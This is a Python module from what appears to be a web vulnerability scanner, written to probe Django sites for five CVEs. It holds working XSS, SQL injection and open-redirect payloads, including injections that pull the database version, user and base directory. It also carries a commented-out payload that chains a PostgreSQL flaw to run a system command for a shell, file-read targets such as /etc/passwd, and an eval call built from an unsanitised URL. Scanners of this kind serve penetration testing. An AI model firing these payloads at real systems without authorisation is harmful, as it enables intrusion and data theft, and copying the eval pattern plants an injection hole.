#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    Django扫描类: 
        1. Django debug page XSS漏洞
            CVE-2017-12794
                Payload: https://vulhub.org/#/environments/django/CVE-2018-14574/

        2. Django JSONfield sql注入漏洞
            CVE-2019-14234
                Payload: https://vulhub.org/#/environments/django/CVE-2018-14574/
                         https://blog.csdn.net/weixin_42250835/article/details/121106792

        3. Django CommonMiddleware url重定向漏洞
            CVE-2018-14574
                Payload: https://vulhub.org/#/environments/django/CVE-2018-14574/

        4. Django GIS函数 sql注入漏洞
            CVE-2020-9402
                Payload: https://vulhub.org/#/environments/django/CVE-2020-9402/
        
        5. Django QuerySet.order_by sql注入漏洞
            CVE-2021-35042
                Payload: https://vulhub.org/#/environments/django/CVE-2021-35042/

file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_int_2
from lib.tool.thread import thread
from payloads.Django.cve_2017_12794 import cve_2017_12794_scan
from payloads.Django.cve_2018_14574 import cve_2018_14574_scan
from payloads.Django.cve_2019_14234 import cve_2019_14234_scan
from payloads.Django.cve_2020_9402 import cve_2020_9402_scan
from payloads.Django.cve_2021_35042 import cve_2021_35042_scan

class Django():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Django'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.random_num_1, self.random_num_2 = random_int_2(5)
        self.random_num = self.random_num_1 + self.random_num_2

        self.cve_2017_12794_payloads = [
            {
                'path': 'create_user/?username=<ScRiPt>prompt(\'{}\')</sCrIpt>'.format(self.random_num),
                'data': ''
            },
            {
                'path': '?username=<ScRiPt>prompt(\'{}\')</sCrIpt>'.format(self.random_num),
                'data': ''
            }
        ]

        self.cve_2019_14234_payloads = [
            {
                'path': 'admin/vuln/collection/?detail__a\'b=123',
                'data': ''
            },
            {
                'path': 'vuln/collection/?detail__a\'b=123',
                'data': ''
            },
            {
                'path': 'collection/?detail__a\'b=123',
                'data': ''
            },
            {
                'path': '?detail__a\'b=123',
                'data': ''
            },
            # {   # * 配合CVE-2019-9193完成Getshell
            #     'path': "?detail__title')%3d'1' or 1%3d1 %3bcopy cmd_exec FROM PROGRAM 'touch /tmp/test.txt'--%20",
            #     'data': ''
            # }
        ]

        self.cve_2018_14574_payloads = [
            {
                'path': '/www.example.com',
                'data': ''
            }
        ]

        self.cve_2020_9402_payloads = [
            {
                'path': '?q=20) = 1 OR (select utl_inaddr.get_host_name((SELECT version FROM v$instance)) from dual) is null  OR (1+1',
                'data': ''
            },
            {
                'path': '?q=0.05))) FROM "VULN_COLLECTION2"  where  (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null  --',
                'data': ''
            }
        ]

        self.cve_2021_35042_payloads = [
            {
                'path': '?order=vuln_collection.name);select updatexml(1, concat(0x7e,(select @@basedir)),1)%23',
                'data': ''
            }
        ]

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2017_12794_scan, url=url),
            thread(target=self.cve_2018_14574_scan, url=url),
            thread(target=self.cve_2019_14234_scan, url=url),
            thread(target=self.cve_2020_9402_scan, url=url),
            thread(target=self.cve_2021_35042_scan, url=url)
        ]

Django.cve_2017_12794_scan = cve_2017_12794_scan
Django.cve_2018_14574_scan = cve_2018_14574_scan
Django.cve_2019_14234_scan = cve_2019_14234_scan
Django.cve_2020_9402_scan = cve_2020_9402_scan
Django.cve_2021_35042_scan = cve_2021_35042_scan

django = Django()